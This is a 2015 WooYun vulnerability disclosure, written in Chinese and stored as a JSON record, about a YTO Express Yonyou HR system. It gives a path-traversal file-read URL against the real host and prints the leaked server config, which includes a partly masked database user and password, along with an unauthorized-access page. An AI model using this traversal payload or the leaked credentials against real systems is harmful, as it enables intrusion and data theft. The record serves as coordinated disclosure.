{"id": 40683, "wybug_id": "wooyun-2015-0104804", "wybug_title": "圆通某系统存在敏感信息泄露和未授权访问（有案例）", "wybug_corp": "圆通", "wybug_author": "Mr.leo", "wybug_date": "2015-03-30 18:17", "wybug_open_date": "2015-05-15 09:58", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-15：\t细节向公众公开  简要描述： 圆通某系统存在敏感信息泄露和未授权访问（有案例） 详细说明：  前人经验  WooYun: 用友某系统任意文件读取 http://hr.f5.yto56.com.cn/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml  圆通用友系统泄露数据库ip、用户名、密码(信息已打码)\n<?xml version=\"1.0\" encoding='gb2312'?>\t<root>\t\t<enableHotDeploy>false</enableHotDeploy>\t\t<domain>\t\t\t<cluster>\t\t\t\t<name>ncCluster</name>\t\t\t\t<protocol>http</protocol>\t\t\t\t<mgr>\t\t\t\t\t<javaHome>./ufjdk</javaHome>\t\t\t\t\t<name>master</name>\t\t\t\t\t<jvmArgs>-Xms512m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m</jvmArgs>\t\t\t\t\t<servicePort>8005</servicePort>\t\t\t\t\t<http>\t\t\t\t\t\t<address>hrapp2</address>\t\t\t\t\t\t<port>9081</port>\t\t\t\t\t</http>\t\t\t\t\t<https>\t\t\t\t\t\t<address>hrapp2</address>\t\t\t\t\t\t<port>9444</port>\t\t\t\t\t</https>\t\t\t\t</mgr>\t\t\t\t<peer>\t\t\t\t\t<javaHome>./ufjdk</javaHome>\t\t\t\t\t<name>ncMem01</name>\t\t\t\t\t<jvmArgs>-Xms512m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m</jvmArgs>\t\t\t\t\t<servicePort>8005</servicePort>\t\t\t\t\t<http>\t\t\t\t\t\t<address>hrapp2</address>\t\t\t\t\t\t<port>9082</port>\t\t\t\t\t</http>\t\t\t\t\t<https>\t\t\t\t\t\t<address>hrapp2</address>\t\t\t\t\t\t<port>9445</port>\t\t\t\t\t</https>\t\t\t\t</peer>\t\t\t\t<peer>\t\t\t\t\t<javaHome>./ufjdk</javaHome>\t\t\t\t\t<name>ncMem03</name>\t\t\t\t\t<jvmArgs>-Xms512m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m</jvmArgs>\t\t\t\t\t<servicePort>8005</servicePort>\t\t\t\t\t<http>\t\t\t\t\t\t<address>hrapp2</address>\t\t\t\t\t\t<port>9084</port>\t\t\t\t\t</http>\t\t\t\t\t<https>\t\t\t\t\t\t<address>hrapp2</address>\t\t\t\t\t\t<port>9447</port>\t\t\t\t\t</https>\t\t\t\t</peer>\t\t\t\t<peer>\t\t\t\t\t<javaHome>./ufjdk</javaHome>\t\t\t\t\t<name>ncMem02</name>\t\t\t\t\t<jvmArgs>-Xms512m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m</jvmArgs>\t\t\t\t\t<servicePort>8005</servicePort>\t\t\t\t\t<http>\t\t\t\t\t\t<address>hrapp2</address>\t\t\t\t\t\t<port>9083</port>\t\t\t\t\t</http>\t\t\t\t\t<https>\t\t\t\t\t\t<address>hrapp2</address>\t\t\t\t\t\t<port>9446</port>\t\t\t\t\t</https>\t\t\t\t</peer>\t\t\t</cluster>\t\t</domain>\t\t<isEncode>true</isEncode>\t\t<internalServiceArray>\t\t\t<name>StartTomcat</name>\t\t\t<serviceClassName>nc.bs.tomcat.startup.BootStrapTomcatService</serviceClassName>\t\t\t<accessDemandRight>15</accessDemandRight>\t\t\t<startService>true</startService>\t\t\t<keyService>false</keyService>\t\t\t<serviceOptions>start|stop</serviceOptions>\t\t</internalServiceArray>\t\t<internalServiceArray>\t\t\t<name>EJB_SERVICE</name>\t\t\t<serviceClassName>nc.bs.mw.naming.EJBContainerService</serviceClassName>\t\t\t<accessDemandRight>15</accessDemandRight>\t\t\t<startService>true</startService>\t\t\t<keyService>false</keyService>\t\t\t<serviceOptions>start|stop</serviceOptions>\t\t</internalServiceArray>\t\t<TransactionManagerProxyClass>nc.bs.mw.tran.IerpTransactionManagerProxy</TransactionManagerProxyClass>\t\t<UserTransactionClass>nc.bs.mw.tran.IerpUserTransaction</UserTransactionClass>\t\t<TransactionManagerClass>nc.bs.mw.tran.IerpTransactionManager</TransactionManagerClass>\t\t<SqlDebugSetClass>nc.bs.mw.sql.UFSqlObject</SqlDebugSetClass>\t\t<XADataSourceClass>nc.bs.mw.ejbsql.IerpXADataSource</XADataSourceClass>\t\t<dataSource>\t\t\t<dataSourceName>yt_test</dataSourceName>\t\t\t<oidMark>V2</oidMark>\t\t\t<databaseUrl>jdbc:oracle:thin:@10.1.xx.xx:1521:ytohrdb</databaseUrl>\t\t\t<user>yt_test</user>\t\t\t<password>ciijfdeddhihebanjdddfijbaxxxxxx</password>\t\t\t<driverClassName>oracle.jdbc.OracleDriver</driverClassName>\t\t\t<databaseType>ORACLE10G</databaseType>\t\t\t<maxCon>50</maxCon>\t\t\t<minCon>10</minCon>\t\t\t<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>\t\t\t<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>\t\t\t<conIncrement>0</conIncrement>\t\t\t<conInUse>0</conInUse>\t\t\t<conIdle>0</conIdle>\t\t</dataSource>\t\t<webServer>\t\t\t<name>webserver_1520189404</name>\t\t\t<address>10.1.xx.xx</address>\t\t\t<port>9080</port>\t\t\t<protocol>http</protocol>\t\t</webServer>\t\t<webServer>\t\t\t<name>webserver_1520189405</name>\t\t\t<address>10.1.xx.xx</address>\t\t\t<port>9443</port>\t\t\t<protocol>https</protocol>\t\t</webServer>\t</root>\n未授权访问页面：http://hr.f5.yto56.com.cn/hrss/rm/RmPsnbasdoc.jsp可参考 WooYun: 用友人力资源管理（e-HR）SQL注入漏洞（2枚） 注入参数，厂商自行检查一下，未深入。   漏洞证明：  已经证明   修复方案：  1，限制未授权目录2，限制敏感信息配置文件   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-03-31 09:57 厂商回复： 非常感谢白帽子，我们已经开始整改了。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}